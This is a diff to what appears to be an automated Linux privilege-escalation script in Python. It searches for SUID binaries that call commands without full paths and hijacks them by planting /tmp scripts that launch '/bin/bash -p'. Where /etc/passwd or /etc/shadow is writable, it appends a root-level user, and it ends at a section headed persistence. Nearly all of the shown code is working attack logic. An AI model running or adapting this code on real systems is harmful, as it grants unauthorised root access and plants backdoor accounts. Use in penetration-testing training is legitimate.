@@ -413,16 +413,16 @@ def path():
    common_cmds = ["base64", "bash", "chmod", "cp", "dig", "docker", "env", "file", "find", "gzip", "mosquitto", "mv", 
    "nmap", "openvpn", "perl", "php", "python", "mysql", "rsync", "strings", "systemctl", "unzip", "vim", "wc", "wget", 
    "zsh", "ls", "ftp", "apache2", "apache", "ssh", "ps", "ss", "cat", "touch", "mkdir", "cd", "rm", "nc", "service", 
-   "help", "smbclient", "echo", "more", "less", "head", "tail", "openssl", "mkpasswd", "pwd", "scp", "python3", "crontab", 
+   "help", "smbclient", "more", "less", "head", "tail", "openssl", "mkpasswd", "pwd", "scp", "python3", "crontab", 
    "git", "gh", "vi", "nano"]
 
    os.system("echo '### the following are possible undefined $PATH binary vulnerabilities ###' > /tmp/path_res.txt")
    os.system("find / -type f -perm /4000 2>/dev/null | tee /tmp/path.txt")
-   print("\n### finding SUID executables that don't specify full path (for $PATH exploit) ###")
+   print("\n### finding SUID executables that don't specify full path (for $PATH exploit) ###\n")
    with open("/tmp/path.txt") as root_files:
       lines = root_files.readlines()
       for line in lines:
-         os.system("file {} 1>> /tmp/file.txt".format(line))
+         os.system("file {} >> /tmp/file.txt".format(line.strip()))
          os.system("echo '' >> /tmp/file.txt")
 
    paths = []
@@ -442,8 +442,8 @@ def path():
          for cmd in common_cmds:
             non_path_cmd = re.search("\s{}\s".format(cmd), f)
             if non_path_cmd:
-               os.system("echo '### {} does not specify full path of {} ###' | tee -a /tmp/path_res.txt".format(path,cmd))
-               os.system("touch /tmp/{}&&echo '#!/bin/bash' > /tmp/{}&&echo '/bin/bash -p' >> /tmp/{}&&chmod +x /tmp/{}&&export PATH=/tmp:$PATH&&.{}".format(cmd,cmd,cmd,path))
+               os.system("echo '### {} does not specify full path of *{}* command... run 'whoami' to confirm root privileges ###' | tee -a /tmp/path_res.txt".format(path,cmd))
+               os.system("touch /tmp/{}&&echo '#!/bin/bash' > /tmp/{}&&echo '/bin/bash -p' >> /tmp/{}&&chmod +x /tmp/{}&&export PATH=/tmp:$PATH&&.{}".format(cmd,cmd,cmd,cmd,path))
                break
             else:
                continue
@@ -462,13 +462,16 @@ def pass_shadow(username,password):
       perms = passwd.readline()
       writable = re.search("\\A.......rw|\\A.......-w", perms)
       if writable:
-         print("\n### /etc/passwd is writable! creating user '{}':'{}'... ###".format(username,password))
+         os.system("echo ''")
+         print("\n###!!! /etc/passwd is writable! creating user '{}':'{}'... ###".format(username,password))
          os.system("echo '{}:{}:0:0:{}:/{}:/bin/bash' >> /etc/passwd".format(username,new_user_pass,username,username))
-         print("\n### root-group user '{}':'{}' created... :su {} ###".format(username,password,username))
-         os.system("echo '### root-group user {}:{} created... :su {} ###' > /tmp/passwd_res.txt".format(username,password,username))
+         print("\n###!!! root-group user '{}':'{}' created... run *su {}* for root privileges ###".format(username,password,username))
+         os.system("echo ''")
+         os.system("echo '### root-group user {}:{} created... run *su {}* for root privileges ###' > /tmp/passwd_res.txt".format(username,password,username))
+         os.system("echo ''")
       else:
-         print("\n*** /etc/passwd is not writable ***")
-         os.system("echo '*** /etc/passwd is NOT world-writable ***' > /tmp/passwd_res.txt")
+         os.system("echo ''")
+         os.system("echo '*** /etc/passwd is NOT world-writable ***' | tee /tmp/passwd_res.txt")
 
    # check if /etc/shadow is writable and if so, add root user
    os.system("ls -l /etc/shadow > /tmp/shad.txt")
@@ -476,13 +479,16 @@ def pass_shadow(username,password):
       perms = shadow.readline()
       writable = re.search("\\A.......rw|\\A.......-w", str(shadow))
       if writable:
-         print("\n### /etc/shadow is writable! creating user '{}':'{}'... ###".format(username,password))
+         os.system("echo ''")
+         print("\n###!!! /etc/shadow is writable! creating user '{}':'{}'... ###".format(username,password))
          os.system("echo '{}:{}:19448:0:99999:7:::' >> /etc/shadow".format(username,new_user_pass))
-         print("\n### root-group user '{}':'{}' created... :su {} ###".format(username,password,username))
-         os.system("echo '### root-group user {}:{} created... :su {} ###' > /tmp/shad_res.txt".format(username,password,username))
+         print("\n###!!! root-group user '{}':'{}' created... run *su {}* for root privileges ###".format(username,password,username))
+         os.system("echo ''")
+         os.system("echo '### root-group user {}:{} created... run *su {}* for root privileges ###' > /tmp/shad_res.txt".format(username,password,username))
+         os.system("echo ''")
       else:
-         print("\n*** /etc/shadow is not writable ***")
-         os.system("echo '*** /etc/shadow is NOT world-writable ***' > /tmp/shad_res.txt")
+         os.system("echo ''")
+         os.system("echo '*** /etc/shadow is NOT world-writable ***' | tee /tmp/shad_res.txt")
 
    pass_file.close()
 
@@ -511,7 +517,7 @@ def root_check():
       if "root" in read_check:
          print("\n-+- welcome, root -+-")
       else:
-         print("\n-+- no privelege escalation path found... try manually -+-")
+         print("\n-+- run 'whoami' to check if you are root user -+-")
 
 
 # persistence ###############################
